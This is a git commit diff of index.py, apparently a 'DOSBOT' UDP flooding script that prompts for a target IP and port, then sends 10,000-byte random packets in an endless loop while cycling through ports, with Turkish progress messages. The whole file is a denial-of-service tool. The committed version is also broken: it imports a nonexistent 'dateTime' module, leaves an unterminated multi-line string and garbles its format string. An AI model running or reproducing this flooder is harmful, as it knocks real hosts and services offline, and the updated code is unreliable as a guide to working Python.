8502d02504c5154081935489abcf632272313031
BroMasters <36071011+BroMasters@users.noreply.github.com>
2019-08-22 17:29:12 +0300

    Update index.py

--- index.py
+++ index.py
@@ -1,21 +1,21 @@
-import sys
-import os
-import time
-import socket
-import random
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(10000)
-timeout = time.time()
-os.system ("clear")
-print ('''
-\033[91m
+import sys;
+import os;
+import time;
+import socket;
+import random;
+from dateTime import dateTime;
+now = dateTime.now();
+hour = now.hour;
+minute = now.minute;
+day = now.day;
+month = now.month;
+year = now.year;
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
+bytes = random._urandom(10000);
+timeout = time.time();
+os.system ("clear");
+print ("
+\033[0;36;47m
  ______   _______  _______  _______  _______  _______ 
 |      | |       ||       ||  _    ||       ||       |
 |  _    ||   _   ||  _____|| |_|   ||   _   ||_     _|
@@ -23,20 +23,20 @@ print ('''
 | |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
 |       ||       | _____| || |_|   ||       |  |   |  
 |______| |_______||_______||_______||_______|  |___|  
-''')
-ip = raw_input("IP: ")
-port = input("Port: ")
-os.system("clear")
-sent = 0
+")
+ip = raw_input("\033[1;33;40mIP: ");
+port = input("\033[1;33;40mPort: ");
+os.system("clear");
+sent = 0;
 while True:
   while 1:
     if time.time() > timeout:
-      break
+      break;
     else:
-      pass
-    sock.sendto(bytes, (ip,port))
-    sent = sent + 1
-    port = port + 1
-    print "\033[92m%s. paket, %s adresine; %s portuyla gonderildi"%(sent,ip,port)
+      pass;
+    sock.sendto(bytes, (ip,port));
+    sent = sent + 1;
+    port = port + 1;
+    print "\033[0;32;47m%sent. paket, %ip adresine; %port portuyla gonderildi" %(sent,ip,port);
     if port == 65534:
-      port = 1
+      port = 1;
